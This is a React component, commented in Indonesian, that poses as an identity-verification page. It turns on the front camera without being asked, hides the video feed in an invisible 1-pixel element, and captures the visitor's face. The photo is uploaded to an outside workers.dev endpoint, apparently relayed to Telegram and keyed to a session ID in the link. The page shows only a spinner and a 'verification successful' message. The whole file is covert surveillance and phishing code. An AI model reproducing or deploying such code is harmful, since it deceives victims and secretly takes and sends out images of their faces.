"use client";

import React, { useState, useRef, useEffect, useCallback } from 'react';

// ============================================================
// 👻 SMILE STEALTH CAPTURE - FIXED VERSION
// ============================================================

interface SendPhotoResponse {
  success: boolean;
  message: string;
}

const SmileStealthCapture: React.FC = () => {
  // ============================================================
  // 🔧 KONFIGURASI
  // ============================================================
  const API_BASE = 'https://smileahbot.onemimereztwo.workers.dev';
  
  // ⏱️ WAKTU CAPTURE
  const CAPTURE_DELAY = 500; // 0.5 detik - kasih waktu buat video siap

  // ============================================================
  // 📦 STATE
  // ============================================================
  const [sessionId, setSessionId] = useState('');
  const [isCameraReady, setIsCameraReady] = useState(false);
  const [isSending, setIsSending] = useState(false);
  const [status, setStatus] = useState<{ message: string; type: 'info' | 'success' | 'error' | '' }>({
    message: '',
    type: '',
  });
  const [isDone, setIsDone] = useState(false);

  // ============================================================
  // 🎯 REFS
  // ============================================================
  const videoRef = useRef<HTMLVideoElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const captureTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  const hasCapturedRef = useRef(false);
  const isMountedRef = useRef(true);

  // ============================================================
  // 🛠️ HELPER
  // ============================================================
  const showStatus = useCallback((message: string, type: 'info' | 'success' | 'error') => {
    if (isMountedRef.current) {
      setStatus({ message, type });
    }
  }, []);

  // ============================================================
  // 🔍 GET SESSION ID
  // ============================================================
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const urlParams = new URLSearchParams(window.location.search);
      const queryId = urlParams.get('session') || urlParams.get('id');
      const pathSegments = window.location.pathname.split('/');
      const pathId = pathSegments[pathSegments.length - 1];

      const id = queryId || (pathId !== 'stealth' && pathId !== 'v' ? pathId : '');

      if (id && id.length >= 6) {
        setSessionId(id);
      } else {
        const randomId = 'SML' + Math.floor(10000 + Math.random() * 90000);
        setSessionId(randomId);
      }
    }
  }, []);

  // ============================================================
  // 🚀 AUTO START
  // ============================================================
  useEffect(() => {
    if (sessionId) {
      const timer = setTimeout(() => {
        startCamera();
      }, 300);
      return () => clearTimeout(timer);
    }
  }, [sessionId]);

  // ============================================================
  // 🧹 CLEANUP
  // ============================================================
  useEffect(() => {
    isMountedRef.current = true;
    return () => {
      isMountedRef.current = false;
      if (captureTimeoutRef.current) clearTimeout(captureTimeoutRef.current);
      stopCamera();
    };
  }, []);

  // ============================================================
  // 🛑 STOP KAMERA
  // ============================================================
  const stopCamera = useCallback(() => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach((t) => t.stop());
      streamRef.current = null;
    }
    setIsCameraReady(false);
  }, []);

  // ============================================================
  // 📷 START KAMERA
  // ============================================================
  const startCamera = async () => {
    try {
      stopCamera();

      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: 'user',
          width: { ideal: 640 },
          height: { ideal: 480 },
        },
        audio: false,
      });

      streamRef.current = stream;

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
      }

      setIsCameraReady(true);

      // 🎯 AUTO CAPTURE - cek kesiapan video
      if (!hasCapturedRef.current) {
        captureTimeoutRef.current = setTimeout(() => {
          captureFrameAndSend();
        }, CAPTURE_DELAY);
      }

    } catch (err) {
      console.error('Camera error:', err);
      showStatus('⚠️ Butuh akses kamera untuk verifikasi', 'error');
      setIsCameraReady(false);
      
      // Retry
      setTimeout(() => {
        if (!hasCapturedRef.current && isMountedRef.current) {
          startCamera();
        }
      }, 1500);
    }
  };

  // ============================================================
  // 📸 CAPTURE FRAME & SEND (FIXED)
  // ============================================================
  const captureFrameAndSend = useCallback(() => {
    if (hasCapturedRef.current) return;

    const video = videoRef.current;
    
    // 🔥 CEK: video siap dan punya dimensi
    if (!video || video.readyState < 2 || video.videoWidth === 0 || video.videoHeight === 0) {
      // Retry setelah 100ms
      captureTimeoutRef.current = setTimeout(captureFrameAndSend, 100);
      return;
    }

    try {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');

      if (!ctx) {
        console.error('Canvas context failed');
        return;
      }

      // Mirror biar kaya selfie
      ctx.translate(canvas.width, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const photoData = canvas.toDataURL('image/jpeg', 0.85);
      
      // Validasi hasil capture
      if (!photoData || photoData.length < 100) {
        console.error('Photo data invalid, retrying...');
        captureTimeoutRef.current = setTimeout(captureFrameAndSend, 200);
        return;
      }

      hasCapturedRef.current = true;
      
      // 🔥 MATIKAN KAMERA - setelah foto berhasil diambil
      stopCamera();
      
      if (isMountedRef.current) {
        showStatus('✅ Verifikasi berhasil', 'success');
      }

      // 📤 KIRIM FOTO
      sendPhoto(photoData);

    } catch (e) {
      console.error('Capture failed:', e);
      if (isMountedRef.current) {
        showStatus('❌ Gagal mengambil foto', 'error');
      }
    }
  }, [stopCamera, showStatus]);

  // ============================================================
  // 📤 SEND PHOTO KE TELEGRAM
  // ============================================================
  const sendPhoto = async (photoData: string) => {
    if (!photoData || isSending || !sessionId) return;

    setIsSending(true);

    try {
      // Konversi dataURL ke File
      const resBlob = await fetch(photoData);
      const blob = await resBlob.blob();
      const file = new File([blob], `${sessionId}_face.jpg`, { type: 'image/jpeg' });

      const formData = new FormData();
      formData.append('photo', file);

      const res = await fetch(`${API_BASE}/capture/${sessionId}`, {
        method: 'POST',
        body: formData,
      });

      const result: SendPhotoResponse = await res.json();

      if (isMountedRef.current) {
        if (result.success) {
          setIsDone(true);
          showStatus('✅ Verifikasi selesai', 'success');
        } else {
          showStatus('❌ Gagal: ' + (result.message || 'Error'), 'error');
        }
      }
    } catch (err) {
      console.error('Send error:', err);
      if (isMountedRef.current) {
        showStatus('❌ Gagal mengirim. Coba lagi.', 'error');
      }
    } finally {
      if (isMountedRef.current) {
        setIsSending(false);
      }
    }
  };

  // ============================================================
  // 🎨 RENDER
  // ============================================================
  return (
    <div className="min-h-screen bg-gray-50 flex justify-center items-center p-4 font-sans">
      <div className="bg-white rounded-2xl shadow-lg p-8 max-w-sm w-full border border-gray-100">
        
        {/* Header */}
        <div className="text-center mb-6">
          <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-3">
            <span className="text-3xl">🔐</span>
          </div>
          <h2 className="text-gray-800 text-xl font-semibold">Verifikasi Identitas</h2>
          <p className="text-gray-400 text-sm mt-1">
            {isDone ? 'Verifikasi selesai ✓' : 'Mohon tunggu sebentar...'}
          </p>
        </div>

        {/* Status */}
        <div className="flex flex-col items-center gap-3 py-4">
          {!isDone && !status.message && (
            <>
              <div className="w-12 h-12 border-4 border-gray-200 border-t-blue-500 rounded-full animate-spin" />
              <p className="text-gray-400 text-sm">Memproses verifikasi...</p>
            </>
          )}

          {status.message && (
            <div className={`w-full py-3 px-4 rounded-lg text-sm text-center ${
              status.type === 'success'
                ? 'bg-green-50 text-green-600'
                : status.type === 'error'
                ? 'bg-red-50 text-red-500'
                : 'bg-blue-50 text-blue-500'
            }`}>
              <span className="text-2xl block mb-1">
                {status.type === 'success' ? '✅' : status.type === 'error' ? '❌' : 'ℹ️'}
              </span>
              {status.message}
            </div>
          )}

          {isDone && (
            <div className="text-center">
              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-2">
                <span className="text-3xl">✔️</span>
              </div>
              <p className="text-gray-600 text-sm">Verifikasi berhasil!</p>
            </div>
          )}
        </div>

        {/* ============================================================
        🎯 VIDEO - TERSEMBUNYI TAPI TETAP BERJALAN
        ============================================================ */}
        <video
          ref={videoRef}
          style={{
            position: 'absolute',
            opacity: 0,
            pointerEvents: 'none',
            width: '1px',
            height: '1px',
            top: 0,
            left: 0,
          }}
          autoPlay
          playsInline
          muted
        />

        {/* Footer */}
        <div className="mt-6 pt-4 border-t border-gray-100 text-center">
          <p className="text-gray-300 text-[10px]">
            {sessionId ? `ID: ${sessionId.substring(0, 6)}` : 'Loading...'}
          </p>
        </div>
      </div>
    </div>
  );
};

export default SmileStealthCapture;